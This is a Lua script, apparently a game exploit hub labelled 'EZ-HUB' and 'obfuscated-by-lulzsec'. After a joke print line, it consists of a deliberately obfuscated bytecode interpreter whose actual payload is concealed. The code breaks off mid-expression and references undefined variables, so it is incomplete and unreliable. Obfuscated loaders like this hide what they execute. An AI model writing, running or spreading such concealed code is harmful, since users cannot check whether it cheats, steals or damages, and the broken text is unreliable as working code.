--obfuscated-by-lulzsec-
--API--SYSTEM--CREDITS-EZ-HUB


--
print("SUSSY BAKA")


do local v0=0;local v1;local v2;local v3;local v4;local v5;local v6;local v7;local v8;local v9;local v10;local v11;local v12;local v13;local v14;local v15;while true do if (v0==4) then vv9());break;end if (v0==0) then v1=tonumber;v2=string.byte;v3=string.char;v4=string.sub;v0=1;end if (v0==1) then v5=string.gsub;v6=string.rep;v7=table.concat;v8=table.insert;v0=2;end if (v0==2) then v9=getfenv or function()return _ENV;end;v10=setmetatable;v11=pcall;v12=select;v0=3;end if (v0==3) then v13=unpack or table.unpack;v14=tonumber;v15=nil;function v15(v16,v17)local v18=0;local v19;local v20;local v21;local v22;local v23;local v24;local v25;local v26;local v27;local v28;local v29;local v30;while true do if (v18==4) then v28=nil;function v28(...)return {...},v12("#",...);end v29=nil;function v29()local v39=0;local v40;local v41;local v42;local v43;local v44;local v45;local v46;local v47;local v48;while true do if (v39~=0) then else v40=0;v41=nil;v39=1 + 0;end if (v39~=3) then else v46=nil;v47=nil;v39=9 -5;end if (v39~=2) then else v44=nil;v45=nil;v39=3;end if (v39==1) then v42=nil;v43=nil;v39=2;end if (v39~=4) then else v48=nil;while true do if (v40==3) then local v95=1090 -(736 + 354);while true do if (v95==0) then v47=nil;v48=nil;v95=1 + 0;end if (1==v95) then v40=3 + 1;break;end end end if (v40~=(1498 -(808 + 689))) then else v43=nil;v44=nil;v40=2;end if (4==v40) then while true do if (v41~=1) then else local v99=0;while true do if (v99==0) then local v107=0 -0;while true do if (v107~=0) then else v44=nil;v45=nil;v107=1;end if (v107~=(1849 -(1559 + 289))) then else v99=2 -1;break;end end end if ((941 -(678 + 262))~=v99) then else v41=2;break;end end end if (v41==(3 + 0)) then v48=nil;while true do local v104=130 -(24 + 106);local v105;local v106;while true do if (0==v104) then v105=0;v106=nil;v104=1 + 0;end if (v104==1) then while true do if (v105==(678 -(550 + 128))) then v106=230 -(72 + 158);while true do if (v106~=1) then else if (v42==(1539 -(186 + 1351))) then local v111=0;local v112;while true do if (0~=v111) then else v112=1039 -(254 + 785);while true do if (v112==(0 -0)) then local v202=0;while true do if (v202~=(0 + 0)) then else for v226=1 -0,v24() do local v227=0 -0;local v228;local v229;local v230;local v231;while true do if (v227==(501 -(442 + 59))) then v228=0;v229=nil;v227=1;end if (v227~=(133 -(58 + 74))) then else v230=nil;v231=nil;v227=6 -4;end if (v227~=(2 + 0)) then else while true do if (v228==(0 -0)) then local v287=0;while true do if (v287~=(1477 -(1244 + 232))) then else v228=1;break;end if ((0 -0)~=v287) then else v229=1646 -(1355 + 291);v230=nil;v287=1;end end end if (v228==1) then v231=nil;while true do if (v229==(2 -1)) then while true do if (v230~=(0 + 0)) then else v231=v22();if (v21(v231,1,1)~=0) then else local v319=0 + 0;local v320;local v321;local v322;local v323;local v324;while true do if (2~=v319) then else v324=nil;while true do if (2==v320) then while true do if (v321==1) then local v332=554 -(517 + 37);local v333;while true do if (v332~=(0 + 0)) then else v333=0;while true do if (v333==1) then v321=2;break;end if ((0 -0)==v333) then local v342=0 + 0;while true do if (v342~=1) then else v333=2 -1;break;end if (0~=v342) then else local v344=0;while true do if (1~=v344) then else v342=1;break;end if ((0 -0)~=v344) then else v324={v23(),v23(),nil,nil};if (v322==0) then local v349=0;local v350;while true do if (0~=v349) then else v350=845 -(206 + 639);while true do if (v350==(1685 -(700 + 985))) then v324[1 + 2]=v23();v324[2 + 2]=v23();break;end end break;end end elseif (v322==1) then v324[1467 -(1003 + 461)]=v24();elseif (v322==2) then v324[3]=v24() -(2^16);elseif (v322~=3) then else local v355=0;local v356;while true do if (v355~=0) then else v356=996 -(658 + 338);while true do if (v356==(875 -(401 + 474))) then v324[3]=v24() -(2^16);v324[8 -4]=v23();break;end end break;end end end v344=1;end end end end end end break;end end end if (v321~=2) then else local v334=0;local v335;while true do if (v334~=(0 -0)) then else v335=0 + 0;while true do if (v335~=1) then else v321=1407 -(693 + 711);break;end if (v335==(0 -0)) then local v343=0;while true do if (v343~=1) then else v335=2 -1;break;end if (v343~=0) then else if (v21(v323,1 + 0,2 -1)==(1 + 0)) then v324[2]=v48[v324[2]];end if (v21(v323,394 -(54 + 338),2)==(1 + 0)) then v324[1 + 2]=v48[v324[1 + 2]];end v343=1;end end end end break;end end end if (v321==(10 -7)) then if (v21(v323,321 -(307 + 11),10 -7)==(1 + 0)) then v324[14 -10]=v48[v324[9 -5]];end v43[v226]=v324;break;end if (v321==(1018 -(520 + 498))) then local v337=1758 -(1041 + 717);local v338;local v339;while true do if ((0 -0)~=v337) then else v338=0 + 0;v339=nil;v337=1;end if (v337~=1) then else while true do if (0~=v338) then else v339=0;while true do if (v339==1) then v321=1;break;end if ((0 -0)~=v339) then else local v345=0 -0;while true do if (v345==1) then v339=1 + 0;break;end if (0==v345) then local v348=0 -0;while true do if (v348==(2 -1)) then v345=1;break;end if (v348==(1987 -(393 + 1594))) then v322=v21(v231,2,3 + 0);v323=v21(v231,12 -8,898 -(821 + 71));v348=1;end end end end end end break;end end break;end end end end break;end if ((0 + 0)==v320) then v321=0 + 0;v322=nil;v320=1;end if (v320~=1) then else local v329=0 -0;while true do if (v329~=0) then else local v340=0 -0;while true do if ((1375 -(761 + 613))==v340) then v329=1;break;end if (v340==0) then v323=nil;v324=nil;v340=1 + 0;end end end if (v329==(1 + 0)) then v320=438 -(236 + 200);break;end end end end break;end if (v319==(1677 -(1519 + 157))) then v322=nil;v323=nil;v319=2;end if (v319~=0) then else v320=0 -0;v321=nil;v319=1;end end end break;end end break;end if (v229==(0 -0)) then local v292=0 -0;local v293;while true do if (v292==(0 -0)) then v293=0 + 0;while true do if (0==v293) then v230=0 -0;v231=nil;v293=1885 -(795 + 1089);end if (v293==(1 + 0)) then v229=1 + 0;break;end end break;end end end end break;end end break;end end end for v232=3 -2,v24() do v44[v232-1]=v29();end v202=1;end if (1~=v202) then else v112=1;break;end end end if (v112~=(1 + 0)) then else local v203=0;while true do if (v203==(0 + 0)) then for v234=1,v24() do v45[v234]=v24();end return v46;end end end end break;end end end break;end if (v106~=(1519 -(137 + 1382))) then else local v110=0 -0;while true do if (v110==0) then local v113=158 -(72 + 86);while true do if (v113==1) then v110=1;break;end if ((0 + 0)~=v113) then else if (v42==(2 -1)) then local v204=0;while true do if (v204==(1102 -(982 + 119))) then for v236=1,v47 do local v237=0;local v238;local v239;local v240;local v241;while true do if (v237~=2) then else while true do if (v238~=(0 -0)) then else v239=0 + 0;v240=nil;v238=1;end if (1==v238) then v241=nil;while true do if (v239~=(489 -(468 + 20))) then else if (v240==(2 -1)) then v241=v22()~=(471 -(437 + 34));elseif (v240==2) then v241=v25();elseif (v240~=(3 + 0)) then else v241=v26();end v48[v236]=v241;break;end if (v239==0) then v240=v22();v241=nil;v239=1;end end break;end end break;end if (v237==(0 + 0)) then v238=31 -(13 + 18);v239=nil;v237=1;end if (v237~=(1854 -(481 + 1372))) then else v240=nil;v241=nil;v237=2;end end end v46[3 + 0]=v22();v204=1302 -(940 + 360);end if (v204~=(2 + 0)) then else v42=2;break;end if ((0 -0)~=v204) then else v47=v24();v48={};v204=295 -(83 + 211);end end end if (v42==(0 + 0)) then local v205=0 + 0;local v206;local v207;while true do if (0~=v205) then else v206=753 -(236 + 517);v207=nil;v205=1;end if (1~=v205) then else while true do if ((0 + 0)~=v206) then else v207=0;while true do if (v207==1) then local v274=0 + 0;while true do if (0==v274) then v45={};v46={v43,v44,nil,v45};v274=1;end if (v274==1) then v207=2;break;end end end if ((1 + 1)~=v207) then else v42=1;break;end if (v207~=(0 -0)) then else local v275=1922 -(1700 + 222);while true do if (v275~=(1 + 0)) then else v207=1;break;end if (v275~=(0 -0)) then else v43={};v44={};v275=3 -2;end end end end break;end end break;end end end v113=1925 -(1572 + 352);end end end if (v110~=(2 -1)) then else v106=1393 -(313 + 1079);break;end end end end break;end end break;end end end break;end if (v41==(8 -6)) then local v100=0;local v101;while true do if (v100==(956 -(37 + 919))) then v101=0;while true do if (v101~=(0 + 0)) then else v46=nil;v47=nil;v101=848 -(420 + 427);end if (v101==(1 -0)) then v41=3;break;end end break;end end end if (v41~=0) then else local v102=375 -(216 + 159);local v103;while true do if (v102==0) then v103=0 + 0;while true do if (v103==(1 + 0)) then v41=1781 -(517 + 1263);break;end if ((317 -(151 + 166))~=v103) then else local v109=0;while true do if (v109~=(0 -0)) then else v42=984 -(260 + 724);v43=nil;v109=1;end if (v109~=(1 + 0)) then else v103=1;break;end end end end break;end end end end break;end if (v40==2) then local v96=0 -0;while true do if (v96==0) then v45=nil;v46=nil;v96=1;end if ((1 + 0)~=v96) then else v40=1 + 2;break;end end end if (v40==0) then v41=0;v42=nil;v40=451 -(400 + 50);end end break;end end end v18=5;end if (v18==2) then function v23()local v49,v50=v2(v16,v19,v19 + 2);v19=v19 + (5 -3);return (v50 * (795 -(191 + 348))) + v49;end v24=nil;function v24()local v51=0 -0;local v52;local v53;local v54;local v55;while true do if (v51==(0 -0)) then v52,v53,v54,v55=v2(v16,v19,v19 + (6 -(1 + 2)));v19=v19 + 4;v51=63 -(38 + 24);end if (v51==(1 -0)) then return (v55 * 16777216) + (v54 * (316075 -250539)) + (v53 * (377 -(182 -61))) + v52;end end end v25=nil;v18=3;end if (v18==5) then v30=nil;function v30(v31,v32,v33)local v56=v31[1];local v57=v31[2];local v58=v31[3];return function(...)local v68=1;local v69= -1;local v70={...};local v71=v12("#",...) -1;local function v72()local v77=v56;local v78=Const;local v79=v57;local v80=v58;local v81=v28;local v82={};local v83={};local v84={};for v91=0 -0,v71 do if ((v91>=v80) or (2361>=(11505 -7506))) then v82[v91-v80]=v70[v91 + 1 + 0];else v84[v91]=v70[v91 + 1 + 0];end end local v85=(v71-v80) + 1 + 0;local v86;local v87;while true do local v92=0;local v93;local v94;while true do if (((1342 + 3339)>=3200) and ((1707 -(1125 + 582))==v92)) then v93=0;v94=nil;v92=1;end if (((136 + 1)<(1889 -(36 + 0 + 909))) and (v92==(1 + 0))) then while true do if ((v93==(0 -0)) or ((3631 -(199 + 1044))<(2988 -(953 + 544)))) then v94=0 + 0;while true do if ((1==v94) or ((2206 + 417)==(180 + 1884))) then if (((1183 -(285 + 633))<(8503 -5031)) and (v87<=19)) then if (((593 + 2297)<(5805 -(1838 + 78))) and (v87<=(25 -16))) then if (((1229 + 686)<=(1912 + 205)) and (v87<=(1619 -(214 + 1401)))) then if (((4055 + 746)>(5777 -4494)) and (v87<=(2 -1))) then if ((v87==0) or ((849 -482)>(7128 -3229))) then local v114=0 + 0;local v115;local v116;local v117;local v118;local v119;while true do if (((4824 -(767 + 2620))<=(5621 -(372 + 319 + 604))) and (1==v114)) then v117=nil;v118=nil;v114=6 -4;end if (((2863 -(824 + 873))>=278) and (v114==(0 -0))) then local v208=0;while true do if (((65 -27)==(1935 -(1106 + 791))) and (v208==(0 -0))) then v115=0 -0;v116=nil;v208=(598 -(189 + 408)) + 0;end if ((((1141 + 1284) -1916)==(196 + 313)) and (v208==((1007 -(319 + 29)) -(566 + 92)))) then v114=1;break;end end end if ((v114==(1 + 1)) or ((4767 -2155)>(4958 -(35 + 85 + 1370)))) then v119=nil;while true do if ((v115==(244 -(201 + 43))) or ((2710 -(288 + 90))<=(6307 -4422))) then local v215=0 + (0 -0);local v216;while true do if ((((1123 -(292 + 785)) + 129)<(5685 -((2131 -(1054 + 87)) + 464))) and (0==v215)) then v216=0;while true do if (((1829 -(759 + 606))<2896) and (v216==(923 -(706 + 216)))) then v115=1 + 0;break;end if ((v216==0) or (2687<=(613 -(16 + 244)))) then local v276=0;while true do if ((v276==(3 -2)) or ((4178 -2710)>=(1132 + (3819 -(311 + 139))))) then v216=805 -(198 + 606);break;end if ((v276==(0 -0)) or (((7012 -4363) -(29 + 247))==(1430 + 429))) then v116=v86[1 + 1];v117,v118=v81(v84[v116](v84[v116 + 1]));v276=423 -(249 + (515 -(325 + 17)));end end end end break;end end end if (((5193 -(169 + 316))==(15597 -10889)) and ((1333 -(399 + 932))==v115)) then for v242=v116,v69 do local v243=0;local v244;while true do if ((v243==(1764 -(661 + 1103))) or ((3615 -985)<(1749 -(187 + 916 + 394)))) then v244=0 -0;while true do if ((v244==(0 -0)) or ((7173 -2262)==3711)) then v119=v119 + 1 + 0;v84[v242]=v117[v119];break;end end break;end end end break;end if ((v115==((2 -1) -(0 + 0))) or (4284>=(2200 + 2303))) then local v217=0;while true do if ((((11493 -7823) -(738 + 1076))<2415) and (v217==(0 + 0))) then v69=(v118 + v116) -(1 + (1716 -(212 + 1504)));v119=0 + 0;v217=1;end if (((3837 -1571)<=3700) and ((1 + 0)==v217)) then v115=6 -4;break;end end end end break;end end elseif ((v86[1 + 1]==v84[v86[4]]) or ((3886 + 284)>(4736 -(334 + 77)))) then v68=v68 + (1 -0);else v68=v86[3];end elseif ((v87<=(1411 -(1238 + 171))) or (329>=706)) then local v120=42 -(8 + 34);local v121;local v122;while true do if ((v120==(0 -0)) or (3413>(928 + 3429))) then v121=0;v122=nil;v120=(1705 -(345 + 73)) -(54 + 1232);end if (((2533 + (766 -(658 + 85)))==(6949 -4393)) and (v120==(1403 -(679 + 723)))) then while true do if ((v121==(0 -0)) or ((4589 -(24 + 634))<(2151 -660))) then v122=v86[(5 -1) -2];do return v13(v84,v122,v69);end break;end end break;end end elseif ((v87>(3 -0)) or ((4408 -(139 + 110))<(449 + 24))) then local v172=0 -0;local v173;while true do if ((v172==(0 -0)) or (2581<=(668 + 29 + 130))) then v173=v86[8 -(225 -(113 + 106))];do return v13(v84,v173,v173 + v86[3 + 0]);end break;end end else v84[v86[1422 -(537 + 883)]]=v84[v86[1 + 2]];end elseif ((139<(2382 -(67 + 481 + 14))) and (v87<=(15 -9))) then if ((v87==(671 -(81 + 585))) or (3057<=2354)) then v84[v86[1237 -(870 + 47 + 318)]]={};else local v124=0 -0;local v125;local v126;local v127;while true do if ((v124==(1757 -(1677 + 79))) or (627==(1949 + 1357))) then v127=nil;while true do if ((1==v125) or ((6573 -(806 + 1180))<((1404 + 3242) -(173 + 183)))) then while true do if (((4077 -(136 + 65))>=(982 -(30 + 146))) and (((0 -0) -0)==v126)) then v127=v86[2];v84[v127]=v84[v127](v84[v127 + 1]);break;end end break;end if (((13267 -8514)>=4011) and ((1070 -(700 + 370))==v125)) then v126=0;v127=nil;v125=1 + 0;end end break;end if (((7035 -5508)>=(200 + 337)) and (v124==(0 -0))) then v125=0;v126=nil;v124=950 -(444 + 505);end end end elseif ((v87<=(2 + (9 -4))) or (1111>=(82 + 3194))) then if (v84[v86[(1 + 3) -2]] or (4634>(5604 -(673 + 294)))) then v68=v68 + 1;else v68=v86[(1671 -(220 + 1080)) -(358 + 10)];end elseif (((4703 -(347 + 188))<=4780) and (v87==(1513 -(52 + 28 + 1425)))) then v84[v86[2]]=v86[2 + 1];else v33[v86[3]]=v84[v86[1 + (14 -(10 + 3))]];end elseif ((v87<=(12 + 2)) or ((578 + 2879)<254)) then if (((2718 -(545 + 199))>(2891 -(684 + 566))) and (v87<=(671 -(323 + 337)))) then if ((v87==(16 -6)) or ((7672 -3061)<=4316)) then do return v84[v86[6 -4]];end elseif ((v84[v86[431 -(242 + 187)]]==v86[14 -10]) or ((789 + 1398)>=3998)) then v68=v68 + (4 -(1638 -(838 + 797)));else v68=v86[1863 -(892 + 968)];end elseif ((4062==(5296 -1234)) and (v87<=(1841 -((2461 -(681 + 716)) + 765)))) then v84[v86[2 -0]]=v86[1 + 2]~=0;elseif ((v87==13) or ((9009 -5468)<=(806 -((28 -11) + 658)))) then v84[v86[6 -4]][v86[1063 -(677 + 383)]]=v84[v86[1 + 3]];elseif (((450 -303)<(4895 -2420)) and  not v84[v86[(2755 -(155 + 941)) -((1156 -834) + 1335)]]) then v68=v68 + (1740 -(300 + 1151 + 288));else v68=v86[9 -6];end elseif ((v87<=(454 -(437 + 1))) or (4478<=(1660 + 345))) then if ((v87>(722 -(445 + 262))) or (((421 + 131) -(37 + 376))>(2826 -1814))) then v84[v86[959 -(506 + (1188 -737))]]();else v84[v86[5 -3]]=v32[v86[1 + 2]];end elseif (((6472 -(571 + 1088))>=(4557 -(1238 + 99))) and (v87<=17)) then local v130=0 -0;local v131;local v132;local v133;local v134;local v135;local v136;while true do if ((596<=(3574 + 89)) and (v130==(8 -5))) then while true do if ((((2398 -1572) + 2550)<(3273 + 343)) and (v131==(1 + 0))) then v134=nil;v135=nil;v131=3 -1;end if ((v131==(0 -0)) or (145>=(575 + 666))) then local v218=0;while true do if (((295 -(170 + 124))==v218) or ((600 + 1771)<=(1905 -1486))) then v131=(15 -11) -3;break;end if ((v218==((0 -0) + 0 + 0)) or ((6546 -4239)>(4602 -(883 + 45)))) then v132=0 + (102 -(30 + 72));v133=nil;v218=1049 -(881 + 167);end end end if ((v131==2) or ((27 + 4331)<1944)) then v136=nil;while true do if ((v132==((0 -0) + 0)) or ((1719 -((488 -(38 + 390)) + 1))<=(1108 -(98 + 114)))) then local v251=0;local v252;while true do if ((((4203 -(111 + 126)) -(15 + 31))>=496) and (v251==((0 + 0) -0))) then v252=0;while true do if ((v252==1) or ((1179 -((1373 -(40 + 737)) + 220))>(3402 -(24 + (329 -(150 + 66)))))) then v132=794 -(445 + 348);break;end if ((v252==0) or ((1851 + 269)>(10286 -5488))) then local v291=0 -(1080 -(26 + 1054));while true do if ((v291==(1776 -(136 + 1640))) or ((4359 -2860)<(2000 -(392 + 1041)))) then v133=v86[3 -1];v134,v135=v81(v84[v133](v13(v84,v133 + 1,v86[1785 -(815 + 967)])));v291=1;end if ((v291==1) or ((3434 + (1895 -1163))==4159)) then v252=1 + 0;break;end end end end break;end end end if ((v132==1) or ((1756 -549)<((396 + 2958) -2358))) then local v253=0 -0;while true do if ((v253==(0 -(0 -0))) or ((7079 -3989)>=(4582 + (1611 -(1153 + 219))))) then local v277=0 + 0;while true do if ((v277==(0 -(0 + 0))) or ((13471 -8760)<1848)) then v69=(v135 + v133) -1;v136=0 + 0;v277=1 -0;end if (((209 -(133 + 75))==v277) or ((958 -561)>=(111 + 947))) then v253=1493 -(372 + 1120);break;end end end if ((v253==(1 -0)) or (2313<=(2609 -(771 + 174)))) then v132=2;break;end end end if ((3967<(5806 -(1459 + 32))) and (v132==(1 + (4 -3)))) then for v259=v133,v69 do local v260=0 -0;local v261;while true do if ((((3630 -2536) -413)<(540 + 3348)) and (v260==0)) then v261=0 + 0;while true do if ((v261==0) or (1568>(8701 -6477))) then v136=v136 + (1 -0);v84[v259]=v134[v136];break;end end break;end end end break;end end break;end end break;end if (((5356 -(1524 + 44))==(5472 -1684)) and (2==v130)) then v135=nil;v136=nil;v130=436 -(189 + 244);end if (((2674 + 109)==2783) and (v130==((551 + 531) -(406 + 676)))) then v131=(190 + 95) -(82 + 203);v132=nil;v130=225 -(112 + 112);end if (((767 -(212 + 478))==(1178 -(874 + 227))) and (v130==(710 -(224 + 92 + 393)))) then v133=nil;v134=nil;v130=409 -(308 + 99);end end elseif ((v87==((841 + 933) -(1323 + 433))) or ((505 + 1109)>=(513 + 810 + 2199))) then local v178=1809 -(211 + 1598);local v179;local v180;local v181;local v182;local v183;while true do if ((v178==2) or ((4276 -(485 + 1135))==(778 + 2248))) then v183=nil;while true do if ((v179==(1 -0)) or ((377 + 81)>1899)) then v182=nil;v183=nil;v179=4 -2;end if (((478 -(70 + 193))<=((1241 + 3608) -(143 + 1620))) and (v179==((15 -8) -5))) then while true do if (((6583 -(311 + 1583))==(3505 + 1184)) and (v180==(1 + 0))) then v183=0;for v278=v181,v86[4] do local v279=1077 -(347 + 730);local v280;while true do if (((0 -0)==v279) or ((8000 -3444)==2065)) then v280=0 + 0;while true do if (((1535 + 1277)<(3206 + (990 -(694 + 42)))) and (v280==0)) then v183=v183 + 1;v84[v278]=v182[v183];break;end end break;end end end break;end if ((v180==0) or ((2308 -1501)>=4536)) then local v270=0 -0;local v271;while true do if ((v270==(0 + 0)) or (1076>(1912 + 2496))) then v271=1603 -(286 + 20 + 1297);while true do if (((8431 -3627)==(5741 -(288 + 649))) and ((1 + 0)==v271)) then v180=1;break;end if (((8043 -5066)>((4689 -(77 + 1338)) -1448)) and (v271==(963 -(202 + 761)))) then local v303=0 + 0;while true do if ((v303==(4 -3)) or ((6260 -3289)>=(235 + 3731))) then v271=1274 -(177 + 1096);break;end if ((v303==0) or ((1626 -(450 + 29))>=(8742 -(6206 -(573 + 899))))) then v181=v86[2];v182={v84[v181](v13(v84,v181 + (1 -0),v69))};v303=3 -2;end end end end break;end end end end break;end if (((170 + 2122)>(8767 -6942)) and (v179==0)) then local v245=0 + 0;while true do if ((v245==(1 + (464 -(241 + 223)))) or ((4891 -(575 + 183))<(1594 + 834))) then v179=693 -(591 + 101);break;end if ((v245==(1104 -(752 + 352))) or ((3300 -(267 + 436))>=(2864 + 339))) then v180=0 -(0 + 0);v181=nil;v245=1;end end end end break;end if (((10288 -6582)<=(5250 -((209 -157) + 279))) and (v178==(1 -0))) then v181=nil;v182=nil;v178=4 -2;end if (((0 -0)==v178) or ((3919 -(22 + 1951))>=(1693 + 706))) then v179=1946 -(952 + (1936 -(129 + 813)));v180=nil;v178=207 -(58 + 148);end end else local v184=0 + 0;local v185;local v186;while true do if ((4191>(8572 -4641)) and (v184==0)) then local v213=517 -(226 + 291);while true do if (((0 + 0)==v213) or ((1006 + 905)>(7216 -5278))) then v185=0 + 0;v186=nil;v213=(169 + 43) -(193 + 18);end if ((v213==(1718 -(1516 + 201))) or ((1378 -793)==3022)) then v184=1;break;end end end if (((557 + 80)<((4083 -858) -(688 + 236))) and (v184==(1 + 0))) then while true do if ((550<(3686 -1414)) and (v185==0)) then v186=v84[v86[79 -(10 + 45 + 20)]];if ( not v186 or (((5595 -3066) + 886)<=(2194 -(127 + 20)))) then InstrPoint=InstrPoint + (1930 -(97 + 1832));else local v262=277 -(177 + 100);local v263;while true do if ((v262==(0 + 0)) or (600>=(4296 -(1436 + 51)))) then v263=0 + 0;while true do if ((v263==(0 -0)) or ((2909 + 60)>=(5435 -2129))) then v84[v86[2 + 0]]=v186;InstrPoint=v86[2 + 1];break;end end break;end end end break;end end break;end end end elseif ((v87<=(16 + 13)) or (223>=2261)) then if ((v87<=(1301 -(730 + 547))) or (2504<((6186 -3651) -(237 + 1109)))) then if ((v87<=(1971 -(610 + 1340))) or ((1605 -502)==(447 -(26 + 41)))) then if ((v87>(1870 -(1352 + 498))) or (((6809 + 8507) -10592)<(453 -263))) then v84[v86[2 + 0]]= -v84[v86[7 -4]];else v68=v86[8 -5];end elseif ((v87<=((723 -(237 + 427)) -37)) or (((2769 -(105 + 1164)) -(671 + 477))==(1251 + 171))) then local v138=0 + 0;local v139;local v140;while true do if ((1733>(1579 -(56 + 730))) and (v138==(0 -(0 + 0)))) then v139=0 + 0;v140=nil;v138=(736 -568) -(42 + 125);end if ((4056>(2348 -676)) and (v138==(1 + 0))) then while true do if (((10545 -8313)<(6122 -2282)) and (v139==(487 -(475 + 12)))) then v140=v86[(1661 -(183 + 35)) -(883 + 558)];v84[v140]=v84[v140](v13(v84,v140 + (330 -(242 + 87)),v69));break;end end break;end end elseif (((4016 -1227)==(11127 -8338)) and (v87==(2 + 21))) then v84[v86[1233 -(561 + 670)]]=v33[v86[10 -7]];else v84[v86[2 -0]][v86[947 -(897 + 47)]]=v86[4];end elseif ((v87<=((270 -206) -38)) or ((215 + (1355 -(792 + 113)))>=(5867 -((677 -199) + 1460)))) then if ((v87>(1608 -(1034 + 549))) or ((3897 -(1205 + 647))<(5709 -3729))) then local v141=0 + 0;local v142;local v143;while true do if (((4059 -2440)<=(3196 -1555)) and (v141==1)) then while true do if ((v142==0) or ((318 + 2199)>=(55 + 4285))) then v143=v86[(512 -(341 + 169)) + (959 -(166 + 793))];v84[v143](v13(v84,v143 + 1 + 0,v69));break;end end break;end if ((v141==((109 -(50 + 59)) + (0 -0))) or ((1281 -(330 + 570))>4211)) then v142=0 -0;v143=nil;v141=2 -1;end end else for v170=v86[385 -(104 + 279)],v86[1 + 2] do v84[v170]=nil;end end elseif (((4850 -(3659 -(1689 + 158)))>747) and (v87<=27)) then local v144=0 -0;local v145;local v146;while true do if ((v144==(1 + 0)) or ((2225 + 51)<(780 + 1001))) then while true do if ((v145==(0 + 0 + 0)) or (((863 + 1594) -(288 + 402))<=(2170 -1231))) then v146=v86[2 + 0];v84[v146](v84[v146 + (1 -0)]);break;end end break;end if (((1538 -1113)<=1226) and (0==v144)) then local v209=0 -0;while true do if (((2338 + 1670)>(52 + (1077 -(195 + 649)))) and (v209==(1 + 0))) then v144=1 + 0;break;end if (((1806 -(479 + 102))==1225) and (v209==(0 + 0))) then v145=0 + 0;v146=nil;v209=1;end end end end elseif (((718 -220)==(2130 -1632)) and (v87>((56 -(15 + 14)) + 1))) then local v189=0 + 0;local v190;local v191;while true do if ((1431==(2327 -(549 + 347))) and (v189==(1 + (1462 -(753 + 709))))) then while true do if (((6145 -3310)>(55 + 34)) and (v190==(0 -0))) then v191=v86[3 -1];do return v84[v191](v13(v84,v191 + (2 -1),v86[3]));end break;end end break;end if (((4423 -(524 + 829))==(4622 -(527 + 1025))) and (v189==(501 -(158 + 343)))) then v190=282 -(80 + 202);v191=nil;v189=1 -0;end end else local v192=868 -(626 + 242);local v193;local v194;local v195;while true do if ((1750<(371 + 1558)) and (0==v192)) then v193=0 -0;v194=nil;v192=1 + 0;end if ((v192==(1 + 0)) or (102>=(1787 + (1343 -1049)))) then v195=nil;while true do if ((v193==1) or ((4601 -((490 -(21 + 98)) + 145))<=((1492 + 829) -(344 + 215)))) then while true do if (((2519 -716)>=379) and (v194==(0 + 0 + 0))) then v195=v86[973 -(821 + 140 + 10)];v84[v195]=v84[v195]();break;end end break;end if (((1223 -(58 + 32))<2422) and (v193==(0 -0))) then local v246=0 + 0;while true do if (((544 -315)<=2059) and (((1 + 0) -0)==v246)) then v193=1;break;end if ((v246==(740 -(287 + 453))) or ((8993 -5579)<1917)) then v194=0 + 0;v195=nil;v246=2 -1;end end end end break;end end end elseif (((1500 + 2643)<4938) and (v87<=(8 + 26))) then if ((v87<=(19 + 12)) or ((907 -(244 + 70))==4405)) then if ((v87>(74 -44)) or ((5359 -1902)==(8000 -3308))) then v84[v86[1265 -(864 + 399)]]=v30(v79[v86[2 + 1]],nil,v33);else local v148=(1026 -(42 + 430)) -(12 + 542);local v149;local v150;while true do if (((8451 -4133)==(3416 + 902)) and (v148==(119 -(14 + 104)))) then while true do if ((v149==(0 + 0)) or ((211 -79)==(3885 -(239 + (344 -(33 + 299)))))) then v150=v86[7 -5];v84[v150]=v84[v150](v13(v84,v150 + 1,v86[109 -(54 + 52)]));break;end end break;end if ((v148==0) or ((381 + 886)>((4087 -(491 + 36)) -(1219 + 187)))) then v149=0 -0;v150=nil;v148=1 + 0;end end end elseif ((((9715 -(653 + 359)) -(10548 -6196))>=2394) and (v87<=((39 -31) + 24))) then local v151=1204 -(873 + (1521 -1190));local v152;local v153;local v154;local v155;local v156;while true do if ((2322==(10263 -7941)) and (v151==(1 + 0 + 0))) then v154=nil;v155=nil;v151=3 -1;end if ((v151==((14 -5) -7)) or ((35 + 4367)<=(2106 + (1885 -(531 + 1210))))) then v156=nil;while true do if (((760 + 3154)<4076) and (v152==(1361 -(110 + 1249)))) then while true do if ((v153==0) or ((1630 + (3792 -2384))<=(636 + (5253 -3019)))) then local v254=0;while true do if (((2 -1)==v254) or ((1214 + 355)>4286)) then v153=1418 -((2256 -(395 + 1547)) + 1103);break;end if (((283 -((11 -5) + 277))==v254) or ((1730 -(628 + 224))>=(4417 -(94 + 26)))) then local v281=0 -0;while true do if (((4850 -(1172 + 385))>=(237 + 741)) and (v281==1)) then v254=2 -1;break;end if (((2381 + (1647 -(331 + 1114)))>=(2911 -((16 -8) + 882))) and (((3020 -(388 + 1514)) -(548 + 570))==v281)) then v154=v79[v86[2 + 1]];v155=nil;v281=1;end end end end end if ((v153==(4 -2)) or ((4258 -2548)<=(596 -(223 + 170)))) then for v264=(292 -217) -(34 + 40),v86[4] do local v265=(1907 -(276 + 1631)) + 0;local v266;local v267;while true do if (((2652 + 2011)==(7289 -2626)) and ((0 -0)==v265)) then v266=0 -0;v267=nil;v265=1 + 0;end if (((6155 -(1653 + 107))==(13219 -8824)) and ((1 + 0)==v265)) then while true do if ((v266==(0 -0)) or ((3660 + 559)==(594 + 23 + 70))) then v68=v68 + 1;v267=v77[v68];v266=1 -0;end if ((v266==1) or ((596 + 33)>=(3089 -(878 + 605)))) then if (((9257 -6056)<(17117 -13407)) and (v267[(4480 -3098) -(94 + 1287)]==(3 + 0))) then v156[v264-(1072 -(1027 + 44))]={v84,v267[637 -(461 + 173)]};else v156[v264-(4 -3)]={v32,v267[3 + 0]};end v83[ #v83 + 1 + 0]=v156;break;end end break;end end end v84[v86[2 -0]]=v30(v154,v155,v33);break;end if ((1==v153) or (((394 + 1286) -1135)==(675 + (12143 -9697)))) then local v256=0;local v257;while true do if (((1963 -(538 + 328))>=(864 -626)) and (v256==(1349 -(431 + 918)))) then v257=224 -(163 + 61);while true do if ((v257==(1 + 0)) or ((3568 -992)<(3109 -(1628 + 224)))) then v153=437 -(261 + 174);break;end if ((v257==(0 + (0 -0))) or ((5141 -(196 + 109))<(4524 -2854))) then v156={};v155=v10({},{__index=function(v298,v299)local v304=0;local v305;local v306;while true do if ((v304==(1 + 0)) or ((2854 -(995 + 503))>=4649)) then while true do if (((18961 -15140)>=(1694 + 799)) and (v305==(0 -0))) then local v325=0;while true do if (((8671 -3762)>=(3655 -(284 + 422))) and (v325==(0 + 0))) then v306=v156[v299];return v306[2 -(1842 -(590 + 1251))][v306[2 + 0 + 0]];end end end end break;end if (((1831 -678)>(719 